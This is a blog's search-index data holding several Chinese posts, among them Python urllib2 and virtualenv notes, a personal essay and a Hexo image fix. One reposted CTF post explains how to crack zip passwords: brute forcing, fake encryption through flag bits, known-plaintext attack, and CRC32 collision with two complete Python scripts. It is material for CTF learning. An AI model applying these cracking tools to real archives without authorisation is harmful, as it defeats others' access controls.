urllib2.install_opener(opener) 10. Timeout 设置# version &lt; 2.6 import urllib2 import socket socket.setdefaulttimeout(10) urllib2.socket.setdefaulttimeout(10) # version &gt;= 2.6 import urllib2 response = urllib2.urlopen(&#39;http://www.google.com&#39;， timeout=10) 11. 在 HTTP Requset 中增加指定的 Headerimport urllib2 request = urllib2.Request(&#39;http://www.baidu.com/&#39;) request.add_header(&#39;User-Agent&#39;, &#39;fake-client&#39;) response = urllib2.urlopen(request) print response.read() 12. 打开 Debug logimport urllib2 httpHandler = urllib2.HTTPHandler(debuglevel=1) httpsHandler = urllib2.HTTPSHandler(debuglevel=1) opener = urllib2.build_opener(httpHandler, httpsHandler) urllib2.install_opener(opener) response = urllib2.urlopen(&#39;http://www.google.com&#39;) 参考文章 Lightless - Python urllib2","tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://iCyris.github.io/tags/PYTHON/"}]},{"title":"Mac 配置虚拟环境 Virtualenv","date":"2017-10-20T17:15:41.000Z","path":"2017/10/21/python-venv/","text":"在Mac自带的Python环境下直接安装一些包时经常会遇到各种问题，也不太喜欢把原生的环境弄乱，就装了个虚拟环境，记录下留着日后用吧。 0x00 前言之前在写Flask的时候接触了Python的虚拟环境Virtualenv，它可以用来创建一个独立的Python运行环境，很干净，很便捷，搭配virtualenvwrapper（一个扩展包，可以更方便地管理虚拟环境）食用更佳。 0x01 安装 virtualenv1. 安装 virtualenv$ sudo pip install virtualenv 2. 建立测试目录$ mkdir testvirtual $ cd testvirtual 3. 创建虚拟环境 venv$ virtualenv venv 0x02 安装 virtualenvwrapperVirtualenvwrapper是一个Virtualenv的扩展包，可以更方便地管理虚拟环境（新增、删除，启动等）。 1. 安装 Virtualenvwrapper默认安装在/usr/local/bin下面 $ sudo easy_install virtualenvwrapper 2. 创建一个文件夹，用来存放所有虚拟环境$ mkdir ~/Workspace $ cd ~/Workspace 3. 设置环境变量把下面两行代码写入~/.zshrc（这个根据自己的shell来写，比如如果你用的是bash，就在~/.bashrc中添加)。 export WORKON_HOME=~/Workspace source /usr/local/bin/virtualenvwrapper.sh 4. 使配置生效$ source ./zshrc 5. 创建一个或多个虚拟环境$ mkvirtualenv venv $ mkvirtualenv venv2 创建成功后路径前面就会有(venv)等字样。 0x03 常见操作命令一些基本操作命令： 1. 列出虚拟环境$ workon venv venv3 或者用lsvirtualenv -b，效果一样。 2. 建立测试目录$ workon venv 3. 查看环境里安装了哪些包$ lssitepackages 4. 进入当前环境$ cdvirtualenv 5. 进入当前环境的site-packages$ cdsitepackages $ cdsitepackages pip 6. 复制虚拟环境$ cpvirtualenv venv venv3 Copying venv as venv3... 7. 退出虚拟环境$ deactivate 8. 删除虚拟环境$ rmvirtualenv venv2 Removing venv2... 接下来安装Python的各种包就很顺利了。 参考文章： http://www.jianshu.com/p/51140800e8b4","tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://iCyris.github.io/tags/PYTHON/"},{"name":"Virtualenv","slug":"Virtualenv","permalink":"https://iCyris.github.io/tags/Virtualenv/"}]},{"title":"给你压缩包却不给你密码的人到底在想什么","date":"2017-10-19T06:58:50.000Z","path":"2017/10/19/rar-attack/","text":"纯转载。原帖戳这里：veritas501 - 给你压缩包却不给你密码的人到底在想什么 0x00 开始在这里，我建议大家装两个解压软件，一个随意（我用的7z），一个是winrar。 嫌右键菜单挤你就装虚拟机里呗。 因为这两个压缩软件压缩出来的zip总是有点不同，最明显的一点，就是在已知明文攻击（后面会说）的时候，两种软件压缩出来的压缩包在构造明文压缩包的时候不能互用。 0x01 注释拿到压缩包上来一定要看有没有注释，一定要看有没有注释，一定要看有没有注释，重要的话说三遍。 有的时候他真的是想送你分，把密码或是hint写在注释里，但你就是不去看他一眼。 用hex方式打开的打一般在末尾 中文注释的话这样可能会乱码。建议压缩软件打开 0x02 弱密码这个其实真的没什么好说的，上来应该先试一试的，因为也不用动脑子，直接放后台跑就行了。 首先先跑纯数字密码，1到9位直接跑一遍，也就1分钟左右的时间吧。 不对的话可以上字典，或是短密码穷举一下，直接丢后台就行，人脑可以再做其他的方向的分析。 另外，如果跑字典都跑不到的话，可以试试此次CTF的名字，或是这个题目的名字。 软件用archpr，网上直接下就行，这里就不分享了。 0x03 压缩包伪加密一个伪加密的压缩包冒充加密压缩包，你要知道压缩软件是如何识别一个压缩包是否被加密的。 软件主要是围绕frFlags和deFlags来判断的。 我们用winrar创建一个加密的压缩包，可以看到加密的压缩包的frFlags和deFlags都为9。 其中，deFlags是针对单个文件的，压缩包中的每个文件都有。 而未加密的都为0。 用7z创建一个加密的压缩包，frFlags和deFlags都为1。这里就不多放图了。 而未加密的依然都为0。 综上，大家应该已经知道怎么改标志位来构造伪加密以及如何搞定伪加密了。（这里添一句，mac OS可以直接打开伪加密的压缩包。） 0x04 已知明文攻击一种比较巧妙的攻击方法，首先你需要一个压缩包中已知的文件(文件大小大于12bytes)，比如readme.txt ├─enc.zip │ ├─flag.txt * │ └─readme.txt * │ └─readme.txt 这样我们就可以构造明文zip ├─plaintext.zip │ └─readme.txt 原理大概是压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件反推加密密钥，利用密钥来解密其他加密文件。 划重点：构造明文压缩包时要选用与加密压缩包相同的压缩软件，如果他用winrar压的，你用7z构造出的压缩包来做明文压缩包，软件是会报错的。 这样就是还原出密钥了，点OK后软件会叫你保存解密后的压缩包。 0x05 CRC碰撞CRC32碰撞用于非常小的文件（6字节以上基本就别试了），就是通过CRC来反推文件内容。 而且CRC32是很容易碰撞的，所以就6字节而言，同一个CRC32可能对应着十几个字符串（纯可视字符）。 当文件刚好是6字节时，使用下面的crc32.py脚本 #!/usr/bin/env python # CRC32 tools by Victor #usage: python crc32.py reverse 0xffffffff（the crc） import argparse import os import sys permitted_characters = set( map(ord, &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890_&#39;)) # \\w testing = False args = None def get_poly(): poly = parse_dword(args.poly) if args.msb: poly = reverseBits(poly) check32(poly) return poly def get_input(): if args.instr: return tuple(map(ord, args.instr)) with args.infile as f: # pragma: no cover return tuple(map(ord, f.read())) def out(msg): if not testing: # pragma: no cover args.outfile.write(msg) args.outfile.write(os.linesep) table = [] table_reverse = [] def init_tables(poly, reverse=True): global table, table_reverse table = [] # build CRC32 table for i in range(256): for j in range(8): if i &amp; 1: i &gt;&gt;= 1 i ^= poly else: i &gt;&gt;= 1 table.append(i) assert len(table) == 256, &quot;table is wrong size&quot; # build reverse table if reverse: table_reverse = [] found_none = set() found_multiple = set() for i in range(256): found = [] for j in range(256): if table[j] &gt;&gt; 24 == i: found.append(j) table_reverse.append(tuple(found)) if not found: found_none.add(i) elif len(found) &gt; 1: found_multiple.add(i) assert len(table_reverse) == 256, &quot;reverse table is wrong size&quot; if found_multiple: out(&#39;WARNING: Multiple table entries have an MSB in {0}&#39;.format( rangess(found_multiple))) if found_none: out(&#39;ERROR: no MSB in the table equals bytes in {0}&#39;.format( rangess(found_none))) def calc(data, accum=0): accum = ~accum for b in data: accum = table[(accum ^ b) &amp; 0xFF] ^ ((accum &gt;&gt; 8) &amp; 0x00FFFFFF) accum = ~accum return accum &amp; 0xFFFFFFFF def rewind(accum, data): if not data: return (accum,) stack = [(len(data), ~accum)] solutions = set() while stack: node = stack.pop() prev_offset = node[0] - 1 for i in table_reverse[(node[1] &gt;&gt; 24) &amp; 0xFF]: prevCRC = (((node[1] ^ table[i]) &lt;&lt; 8) | (i ^ data[prev_offset])) &amp; 0xFFFFFFFF if prev_offset: stack.append((prev_offset, prevCRC)) else: solutions.add((~prevCRC) &amp; 0xFFFFFFFF) return solutions def findReverse(desired, accum): solutions = set() accum = ~accum stack = [(~desired,)] while stack: node = stack.pop() for j in table_reverse[(node[0] &gt;&gt; 24) &amp; 0xFF]: if len(node) == 4: a = accum data = [] node = node[1:] + (j,) for i in range(3, -1, -1): data.append((a ^ node[i]) &amp; 0xFF) a &gt;&gt;= 8 a ^= table[node[i]] solutions.add(tuple(data)) else: stack.append(((node[0] ^ table[j]) &lt;&lt; 8,) + node[1:] + (j,)) return solutions # Tools def parse_dword(x): return int(x, 0) &amp; 0xFFFFFFFF def reverseBits(x): # http://graphics.stanford.edu/~seander/bithacks.html#ReverseParallel # http://stackoverflow.com/a/20918545 x = ((x &amp; 0x55555555) &lt;&lt; 1) | ((x &amp; 0xAAAAAAAA) &gt;&gt; 1) x = ((x &amp; 0x33333333) &lt;&lt; 2) | ((x &amp; 0xCCCCCCCC) &gt;&gt; 2) x = ((x &amp; 0x0F0F0F0F) &lt;&lt; 4) | ((x &amp; 0xF0F0F0F0) &gt;&gt; 4) x = ((x &amp; 0x00FF00FF) &lt;&lt; 8) | ((x &amp; 0xFF00FF00) &gt;&gt; 8) x = ((x &amp; 0x0000FFFF) &lt;&lt; 16) | ((x &amp; 0xFFFF0000) &gt;&gt; 16) return x &amp; 0xFFFFFFFF # Compatibility with Python 2.6 and earlier. if hasattr(int, &quot;bit_length&quot;): def bit_length(num): return num.bit_length() else: def bit_length(n): if n == 0: return 0 bits = -32 m = 0 while n: m = n n &gt;&gt;= 32 bits += 32 while m: m &gt;&gt;= 1 bits += 1 return bits def check32(poly): if poly &amp; 0x80000000 == 0: out(&#39;WARNING: polynomial degree ({0}) != 32&#39;.format(bit_length(poly))) out(&#39; instead, try&#39;) out(&#39; 0x{0:08x} (reversed/lsbit-first)&#39;.format(poly | 0x80000000)) out(&#39; 0x{0:08x} (normal/msbit-first)&#39;.format(reverseBits(poly | 0x80000000))) def reciprocal(poly): &#39;&#39;&#39; Return the reversed reciprocal (Koopman notatation) polynomial of a reversed (lsbit-first) polynomial &#39;&#39;&#39; return reverseBits((poly &lt;&lt; 1) | 1) def print_num(num): &#39;&#39;&#39; Write a numeric result in various forms &#39;&#39;&#39; out(&#39;hex: 0x{0:08x}&#39;.format(num)) out(&#39;dec: {0:d}&#39;.format(num)) out(&#39;oct: 0o{0:011o}&#39;.format(num)) out(&#39;bin: 0b{0:032b}&#39;.format(num)) import itertools def ranges(i): for kg in itertools.groupby(enumerate(i), lambda x: x[1] - x[0]): g = list(kg[1]) yield g[0][1], g[-1][1] def rangess(i): return &#39;, &#39;.join(map(lambda x: &#39;[{0},{1}]&#39;.format(*x), ranges(i))) # Parsers def get_parser(): &#39;&#39;&#39; Return the command-line parser &#39;&#39;&#39; parser = argparse.ArgumentParser( description=&quot;Reverse, undo, and calculate CRC32 checksums&quot;) subparsers = parser.add_subparsers(metavar=&#39;action&#39;) poly_flip_parser = argparse.ArgumentParser(add_help=False) subparser_group = poly_flip_parser.add_mutually_exclusive_group() subparser_group.add_argument( &#39;-m&#39;, &#39;--msbit&#39;, dest=&quot;msb&quot;, action=&#39;store_true&#39;, help=&#39;treat the polynomial as normal (msbit-first)&#39;) subparser_group.add_argument(&#39;-l&#39;, &#39;--lsbit&#39;, action=&#39;store_false&#39;, help=&#39;treat the polynomial as reversed (lsbit-first) [default]&#39;) desired_poly_parser = argparse.ArgumentParser(add_help=False) desired_poly_parser.add_argument( &#39;desired&#39;, type=str, help=&#39;[int] desired checksum&#39;) default_poly_parser = argparse.ArgumentParser(add_help=False) default_poly_parser.add_argument( &#39;poly&#39;, default=&#39;0xEDB88320&#39;, type=str, nargs=&#39;?&#39;, help=&#39;[int] polynomial [default: 0xEDB88320]&#39;) accum_parser = argparse.ArgumentParser(add_help=False) accum_parser.add_argument( &#39;accum&#39;, type=str, help=&#39;[int] accumulator (final checksum)&#39;) default_accum_parser = argparse.ArgumentParser(add_help=False) default_accum_parser.add_argument( &#39;accum&#39;, default=&#39;0&#39;, type=str, nargs=&#39;?&#39;, help=&#39;[int] starting accumulator [default: 0]&#39;) outfile_parser = argparse.ArgumentParser(add_help=False) outfile_parser.add_argument(&#39;-o&#39;, &#39;--outfile&#39;, metavar=&quot;f&quot;, type=argparse.FileType(&#39;w&#39;), default=sys.stdout, help=&quot;Output to a file instead of stdout&quot;) infile_parser = argparse.ArgumentParser(add_help=False) subparser_group = infile_parser.add_mutually_exclusive_group() subparser_group.add_argument(&#39;-i&#39;, &#39;--infile&#39;, metavar=&quot;f&quot;, type=argparse.FileType(&#39;rb&#39;), default=sys.stdin, help=&quot;Input from a file instead of stdin&quot;) subparser_group.add_argument(&#39;-s&#39;, &#39;--str&#39;, metavar=&quot;s&quot;, type=str, default=&#39;&#39;, dest=&#39;instr&#39;, help=&quot;Use a string as input&quot;) subparser = subparsers.add_parser(&#39;flip&#39;, parents=[outfile_parser], help=&quot;flip the bits to convert normal(msbit-first) polynomials to reversed (lsbit-first) and vice versa&quot;) subparser.add_argument(&#39;poly&#39;, type=str, help=&#39;[int] polynomial&#39;) subparser.set_defaults( func=lambda: print_num(reverseBits(parse_dword(args.poly)))) subparser = subparsers.add_parser(&#39;reciprocal&#39;, parents=[outfile_parser], help=&quot;find the reciprocal (Koopman notation) of a reversed (lsbit-first) polynomial and vice versa&quot;) subparser.add_argument(&#39;poly&#39;, type=str, help=&#39;[int] polynomial&#39;) subparser.set_defaults(func=reciprocal_callback) subparser = subparsers.add_parser(&#39;table&#39;, parents=[outfile_parser, poly_flip_parser, default_poly_parser], help=&quot;generate a lookup table for a polynomial&quot;) subparser.set_defaults(func=table_callback) subparser = subparsers.add_parser(&#39;reverse&#39;, parents=[ outfile_parser, poly_flip_parser, desired_poly_parser, default_accum_parser, default_poly_parser], help=&quot;find a patch that causes the CRC32 checksum to become a desired value&quot;) subparser.set_defaults(func=reverse_callback) subparser = subparsers.add_parser(&#39;undo&#39;, parents=[ outfile_parser, poly_flip_parser, accum_parser, default_poly_parser, infile_parser], help=&quot;rewind a CRC32 checksum&quot;) subparser.add_argument(&#39;-n&#39;, &#39;--len&#39;, metavar=&#39;l&#39;, type=str, default=&#39;0&#39;, help=&#39;[int] number of bytes to rewind [default: 0]&#39;) subparser.set_defaults(func=undo_callback) subparser = subparsers.add_parser(&#39;calc&#39;, parents=[ outfile_parser, poly_flip_parser, default_accum_parser, default_poly_parser, infile_parser], help=&quot;calculate the CRC32 checksum&quot;) subparser.set_defaults(func=calc_callback) return parser def reciprocal_callback(): poly = parse_dword(args.poly) check32(poly) print_num(reciprocal(poly)) def table_callback(): # initialize tables init_tables(get_poly(), False) # print table out(&#39;[{0}]&#39;.format(&#39;, &#39;.join(map(&#39;0x{0:08x}&#39;.format, table)))) def reverse_callback(): # initialize tables init_tables(get_poly()) # find reverse bytes desired = parse_dword(args.desired) accum = parse_dword(args.accum) # 4-byte patch patches = findReverse(desired, accum) for patch in patches: out(&#39;4 bytes: {{0x{0:02x}, 0x{1:02x}, 0x{2:02x}, 0x{3:02x}}}&#39;.format(*patch)) checksum = calc(patch, accum) out(&#39;verification checksum: 0x{0:08x} ({1})&#39;.format( checksum, &#39;OK&#39; if checksum == desired else &#39;ERROR&#39;)) # 6-byte alphanumeric patches for i in permitted_characters: for j in permitted_characters: patch = [i, j] patches = findReverse(desired, calc(patch, accum)) for last_4_bytes in patches: if all(p in permitted_characters for p in last_4_bytes): patch.extend(last_4_bytes) out(&#39;alternative: {1}{2}{3}{4}{5}{6} ({0})&#39;.format( &#39;OK&#39; if calc(patch, accum) == desired else &#39;ERROR&#39;, *map(chr, patch))) def undo_callback(): # initialize tables init_tables(get_poly()) # calculate checksum accum = parse_dword(args.accum) maxlen = int(args.len, 0) data = get_input() if not 0 &lt; maxlen &lt;= len(data): maxlen = len(data) out(&#39;rewinded {0}/{1} ({2:.2f}%)&#39;.format(maxlen, len(data), maxlen * 100.0 / len(data) if len(data) else 100)) for solution in rewind(accum, data[-maxlen:]): out(&#39;&#39;) print_num(solution) def calc_callback(): # initialize tables init_tables(get_poly(), False) # calculate checksum accum = parse_dword(args.accum) data = get_input() out(&#39;data len: {0}&#39;.format(len(data))) out(&#39;&#39;) print_num(calc(data, accum)) def main(argv=None): &#39;&#39;&#39; Runs the program and handles command line options &#39;&#39;&#39; parser = get_parser() # Parse arguments and run the function global args args = parser.parse_args(argv) args.func() if __name__ == &#39;__main__&#39;: main() # pragma: no cover 示例： 当字节数小于6时，用下面的crack.py脚本（用python3）： #!/usr/bin/env python3 import sys import os import string import collections import argparse parser = argparse.ArgumentParser() parser.add_argument(&#39;file&#39;, nargs=&#39;*&#39;) parser.add_argument(&#39;--hex&#39;, action=&#39;append&#39;) parser.add_argument(&#39;--dec&#39;, action=&#39;append&#39;) parser.add_argument(&#39;--limit&#39;, type=int) parser.add_argument(&#39;--compiler&#39;, default=&#39;g++&#39;) parser.add_argument(&#39;--alphabet&#39;, type=os.fsencode, default=string.printable.encode()) args = parser.parse_args() targets = collections.OrderedDict() limit = 0 crcs = [] if args.limit: limit = max(limit, args.limit) if args.hex or args.dec: if not args.limit: parser.error(&#39;Limit of length not specified&#39;) if args.hex: for s in args.hex: crc = int(s, 16) targets[s] = crc for l in range(args.limit + 1): crcs += [( crc, l )] if args.dec: for s in args.dec: crc = int(s) targets[s] = crc for l in range(args.limit + 1): crcs += [( crc, l )] if args.file: print(&#39;reading zip files...&#39;, file=sys.stderr) import zipfile for zipname in args.file: fh = zipfile.ZipFile(zipname) for info in fh.infolist(): targets[&#39;%s / %s&#39; % ( zipname, info.filename )] = ( info.CRC, info.file_size ) crcs += [( info.CRC, info.file_size )] limit = max(limit, info.file_size) print(&#39;file found: %s / %s: crc = 0x%08x, size = %d&#39; % (zipname, info.filename, info.CRC, info.file_size), file=sys.stderr) if not crcs: parser.error(&#39;No CRCs given&#39;) # compiling c++ in python script is the easy way to have the both a good interface and better speed code = &#39;&#39; code += r&#39;&#39;&#39; #include &lt;cstdio&gt; #include &lt;vector&gt; #include &lt;array&gt; #include &lt;string&gt; #include &lt;set&gt; #include &lt;cstdint&gt; #include &lt;cctype&gt; #define repeat(i,n) for (int i = 0; (i) &lt; (n); ++(i)) using namespace std; uint32_t crc_table[256]; void make_crc_table() { repeat (i, 256) { uint32_t c = i; repeat (j, 8) { c = (c &amp; 1) ? (0xedb88320 ^ (c &gt;&gt; 1)) : (c &gt;&gt; 1); } crc_table[i] = c; } } const uint32_t initial_crc32 = 0xffffffff; uint32_t next_crc32(uint32_t c, char b) { return crc_table[(c ^ b) &amp; 0xff] ^ (c &gt;&gt; 8); } const uint32_t mask_crc32 = 0xffffffff; const char alphabet[] = { &#39;&#39;&#39; + &#39;, &#39;.join(map(str, args.alphabet)) + r&#39;&#39;&#39; }; const int limit = &#39;&#39;&#39; + str(limit) + r&#39;&#39;&#39;; array&lt;set&lt;uint32_t&gt;, limit+1&gt; crcs; string stk; void dfs(uint32_t crc) { if (crcs[stk.length()].count(crc ^ mask_crc32)) { fprintf(stderr, &quot;crc found: 0x%08x: \\&quot;&quot;, crc ^ mask_crc32); for (char c : stk) fprintf(stderr, isprint(c) &amp;&amp; (c != &#39;\\\\&#39;) ? &quot;%c&quot; : &quot;\\\\x%02x&quot;, c); fprintf(stderr, &quot;\\&quot;\\n&quot;); printf(&quot;%08x &quot;, crc ^ mask_crc32); for (char c : stk) printf(&quot; %02x&quot;, c); printf(&quot;\\n&quot;); } if (stk.length() &lt; limit) { for (char c : alphabet) { stk.push_back(c); dfs(next_crc32(crc, c)); stk.pop_back(); } } } int main() { &#39;&#39;&#39; for crc, size in crcs: code += &#39; crcs[&#39; + str(size) + &#39;].insert(&#39; + hex(crc) + &#39;);\\n&#39; code += r&#39;&#39;&#39; make_crc_table(); dfs(initial_crc32); return 0; } &#39;&#39;&#39; import tempfile import subprocess with tempfile.TemporaryDirectory() as tmpdir: cppname = os.path.join(tmpdir, &#39;a.cpp&#39;) with open(cppname, &#39;w&#39;) as fh: fh.write(code) binname = os.path.join(tmpdir, &#39;a.out&#39;) print(&#39;compiling...&#39;, file=sys.stderr) p = subprocess.check_call([args.compiler, &#39;-std=c++11&#39;, &#39;-O3&#39;, &#39;-o&#39;, binname, cppname]) print(&#39;searching...&#39;, file=sys.stderr) p = subprocess.Popen([binname], stdout=subprocess.PIPE) output, _ = p.communicate() print(&#39;done&#39;, file=sys.stderr) print(file=sys.stderr) result = collections.defaultdict(list) for line in output.decode().strip().split(&#39;\\n&#39;): crc, *val = map(lambda x: int(x, 16), line.split()) result[( crc, len(val) )] += [ bytes(val) ] for key, crc in targets.items(): for s in result[crc]: print(&#39;%s : %s&#39; % (key, repr(s)[1:])) 示例： 0x06 MORE还有很多压缩包的密码需要联系题中的其他文件来解，这个就不在本篇的讨论范围内了，故不再讨论。","tags":[{"name":"CTF","slug":"CTF","permalink":"https://iCyris.github.io/tags/CTF/"}]},{"title":"觉得理性的人快乐嘛","date":"2017-07-12T12:34:52.000Z","path":"2017/07/12/the-seed/","text":"只是你不知道我的狂野。 一、靠在窗外的人 读着窗边的景初中高中的时候经常会在空间或者朋友圈发些简短的话，诸如“不是雪晚了，只是年早了（记某次终于到来的雪，很兴奋，看了以往的日历才发现，是那年年过得早，所以才有雪来得迟的感受）”，“把书夹在光里（第一次见到那种夹子式的移动台灯的时候，把它夹在了硬皮书上然后靠在床前阅读）”，类似的还有很多，似乎变成了动态圈的一股清流，也不求多少赞，不想多少评论，只是想说，就说了。（那时候也不会想到这些话会成为水母喜欢自己的一部分理由）。现在很少发朋友圈之类的，主要是多了些可以说话的人吧，表达的对象与地方都发生了些改变。当然不同的人会采取不同的表达方式，所以衍生出了各种各样的圈子，过得开心即可。 每个阶段的“回家”都是有不同的意义的。 其实一直很羡慕有弟弟妹妹的人，大概是“独生”带来的某种程度的孤独感太过真实了吧。于是可以说话的“人”，从小时候的玩具，到游戏里的熟人，到窗外的天空，云与太阳，到曾经觉得会合不来现在却无话不说的挚友，到水母玲，每个阶段都有独到的故事在。 这里没有提到父母或者各类长辈，不清楚其他家的情况所以不作大体的评价，不过对于我自己，其实在物质得到一定的满足之后，会转而追求一些精神上的东西，而这些是更偏向物质追求的那一代很难给予的，他们会以经验，以自己的想法告诉你，应该怎么去做，家长，孩子，男人，女人，这些的区别在他们的眼里有时候太过强烈了，以致于你做了一件你想做的事可能会被说，你不能这么做，你是男孩子所以要强硬不能柔软，你是女孩子所以不要经常出去玩，你是小孩不要听我们讲话，不要管大人的事，专心读书就好，之类，（这样看来女装反而是一种思想的解放呢hh）就比如不管大人的事，其实孩子很聪明，学语言的速度就比大人快上很多，这样的学习能力，以“大人的事”来限制一些思想的开拓，其实觉得挺可惜的（也算是之后很长一段时间不太爱和他们说话的原因吧）。 以前会觉得不舒服，会闹脾气，随意得不理他们，一是确实不喜欢一些做法和说法，二是前一段时间才想到的，可能觉得无论自己怎么耍性子他们都不会离开自己丢下自己，所以潜意识里助长了一些任性呢。好在自己也是个比较平静的人，不会太过生气，不会太过任性，即使偶尔有些意见的争执，不是无意义的大吵大闹就可以接受。以及，他们确实是爱着自己关心着自己的 —— 以他们自己的方式。虽然作为一个个体，我们拥有管理自己的情绪和释放自己属性的权利 —— 只是合适不合适的问题。比较“妥善”的释放，不仅可以最大限度地解压，也是一种成熟的体现吧。学会控制是门艺术，它不是对自己的压抑，反而是种引导式的增益。 对自己也好，对其他关心甚至爱着自己的人也好。 靠在窗外的人，读着窗边的景。 搬到新家以后，会经常靠在客厅的窗边看着窗外的天。没有任何建筑的遮挡，视野获得了最大程度的自由。会觉得离天空很近，离太阳很近，离风很近，离云很近，离飞鸟很近，离生命很近。他们每天走着不一样的轨迹，但却丰满而深刻。拍了很多这个位置这个视角下的照片，每一张都不一样，情理之中。不过这里不是说景色的搭配不一样，而是他们所展现的力量，是色彩的灵活搭配下深度展现给我，带给我震撼感的东西。 天空是会说话的，如果你用心说，如果你用心听。那段日子，虽然大人们看来是“很无聊的发呆”，自己却觉得是意外的充实与滋润。 二、交心前段时间回归了一下以前玩过的一款游戏，果然还是热爱着RPG呢。因为剧情和地图人设都觉得做得不错，就安利给了女友，一起玩了会儿，也算是了了一个心愿呢。惊喜的是她也很喜欢这款游戏，不过随着等级的上升，遇到使用第三方插件的玩家越来越多，不对，不应该称作玩家，而是商人吧。抢占着地图与道具，把正常玩家挤下线，并严重阻碍着任务的完成度。 这是款冷了很久的游戏，当初退出它就是因为过分的商业化，而代理商并没有解决问题的力量，不如说不愿去解决吧。吃相并不好看。好好的游戏体验，只能在回忆里体验到了。即使喜欢着游戏本身，女友也因为受不了这点，不出几日便删了游戏。有太多的脏话想说。然而该说的几年前就说了，现在能找到一些记忆里的体验就已经很棒了。 除了这款游戏，还有的比较深印象的是初中的时候逛着贴吧找到了[异次元服务器]，一个用服务器搭着MC进行游戏的小圈子。以前觉得弄服务器什么的很厉害，但是后来才知道其中大部分人是比自己还小的，也更说明了孩子的学习能力的强力呢。当然我在这里想说的不是游戏的体验，而是一些其他的东西。一起玩过游戏的人，有的已经结婚生子，有的还在积极备考，有的是和自己一样或者相似的人。很多人可能都没有见过面，但是现在还有着一些联系，很感动。在这种充斥着不信任的时代里，这种温暖显得难得可贵，即使隔着屏幕，也能感受到一些亲和。 我称这种体验为交心。 当然离我们更近的交心体验还是朋友间，恋人间的。嗯也借这个机会谈谈一些恋爱观与设想吧。 其实成长到现在，不仅是自己，整个社会的恋爱观都在发生着变化，从以前的连靠得很近都觉得是种羞耻的时代到了可以大胆去表达，表现爱的时代，觉得也是种进步呢，也是种解放。年轻人们有着自己的方式与理解去决定如何去爱，最主要的是如何去选择对象与对自己身体的开放程度，比如现在的勾肩搭背搂抱可能是以前的人所无法接受的呢。当然远不止这些。 这些概括起来大致是[选择权]的提升吧，说起来本该拥有的东西现在被赋予了或者说争取到了还觉得开心，其实有点奇怪的呢。 这世界，两个人，能相遇，不容易。 当谈及恋爱的时候，我觉得不管是在哪个年龄，都不该含着一种羞耻心，最常见的就是你比邻居家的某个哥哥姐姐要早有男票女票，你的爸妈可能会觉得有某种“不妥”，甚至对方到家里来玩都要遮遮掩掩不好意思，这本身就有一种不合理的成分在。爱的经营好比商业，甚至比经商还要复杂，那么人们是否会因为你年纪轻轻比周围的中年工作党还赚得多而感到羞耻嘛？显然不会，他们还会夸这样的你。那么为什么放到恋爱这边会有这样的差别呢，其实还是一种物质世界与精神世界的搭配不均，或者说某种传统的偏见束缚所引起的，那么爱与性的解放，其实还有很长一段路要走。我们所关注的，应该是如何去引导自己或者自己的孩子，去提升整场感情的质量，而非冠冕的“为了你好以xx为重不能这样不能这样”，这是种压制，而非利于他成长的体验。 有幸捕捉到一只有相近目标的女票，并不会觉得将来会因为专业的重合而使得乐趣与圈子重合而造成乐趣的减少，当然下一章任务的解锁与成就的体验会需要现在的一些努力与投入，听起来有点教条，但还是这个理呢XD。你没办法说，现在靠着家长享受着一些东西，以后也可以这样。无济于事可能来自于自己的无能为力，这种感觉会非常痛苦。 长久的陪伴融合并不是让一个人去迁就另一个人，可能很多男生会觉得一直哄一直宠着女票就可以，很多人觉得以后肯定会这么做，然而这其实不是健康的感情，爱是双向的，你的温柔与包容是必须的，但是同时你吸引对方的，一定不是如何宠溺，而是你本身。带给她无限关怀的可能不止你一个人能做到，但是要牢牢得用自身去吸引她的，只有你能做到。如果对方一直没有什么亮点的话，你会觉得各种对自己的好都显得那么普通，而如果是不断吸引着自己的人呢，其实稍微对你的注意与关怀都会感觉像是上帝的恩赐一般，甚至整天的心情都是那么棒。 可以在做着不一样的事，可以有着不同认识的人，但是你会成为她的住所，会是她愿意回来且能感到安心的地方，你们之间可以有抱怨，但是没有猜疑；可以有嫌弃，但也有迷人的部分，仅此一人。每天重复着一样的动作，仅仅是吃饭睡觉一起上课，会显得疲倦，于是可以尝试着加些创意，因为有她，你有源源不断的点子，因为是她，所以你愿意去投入一定的时间去准备这些小惊喜，而在属于自己的时间，最大效率地完成学习，完成工作，成就自己。去打造深化自己拥有的也不断吸引着她的优点，去增强自己的能力以去更好地守护她，守护这段感情，守护自己。这个过程不会简单，其中必定会有不理解与小委屈，但是只要面对着对方的是真实的内心，这些都很容易解决。 也希望自己能够成长为可以独挡一面，成熟的人。 祝愿，祝福。 以上。","tags":[{"name":"煮字","slug":"煮字","permalink":"https://iCyris.github.io/tags/煮字/"}]},{"title":"Hexo 博客图片问题解决办法","date":"2017-07-12T11:46:06.000Z","path":"2017/07/12/blog-picture-issue/","text":"关于hexo博客图片无法正常显示的问题的解决办法。 之前一直用的MarkdownPad2自带的添加图片按钮来添加图片（存储在hexo/source/imag里），但是经常会有显示不出的情况，不喜欢用各大图床，于是查了一波本地存储上传的方法，找到了一个插件来修正img标签以使图片正常显示。 参考自简书。 0x01 Asset设定确认首先确认_config.yml 中有 post_asset_folder:true。这时候每次hexo new会自动建立一个与文章同名的文件夹，我们可以把与该文章相关的所有资源都放到那个文件夹，来更方便得调用资源。 0x02 插件添加在hexo文件夹执行： npm install https://github.com/CodeFalling/hexo-asset-image –save 0x03 图片添加完成安装后新建一个文件试试，发现在.md文件同级目录下会有一个同名文件夹。比如我们新建了一个文件blog-picture-issue.md，然后在同名文件夹里放张图：1.png。 之后在原图片引用语句的括号里写入： blog-picture-issue/1.PNG 就能看到正常显示的图片了： 注：[]里是图片的名称，可不写。 0x04 issued这样的操作以后生成的html是： &lt;img src=&quot;/2017/07/12/blog-picture-issue/1.PNG&quot; alt=&quot;logo&quot;&gt; 而非之前的： &lt;img src=&quot;blog-picture-issue/1.PNG&quot; alt=&quot;logo&quot;&gt;” 使得图片正常显示。","tags":[{"name":"HEXO","slug":"HEXO","permalink":"https://iCyris.github.io/tags/HEXO/"}]},{"title":"菠萝牛肉饭","date":"2017-07-02T03:54:20.000Z","path":"2017/07/02/tea-maker/","text":"菠萝，青菜，牛肉，米饭，芝麻，番茄蛋汤。 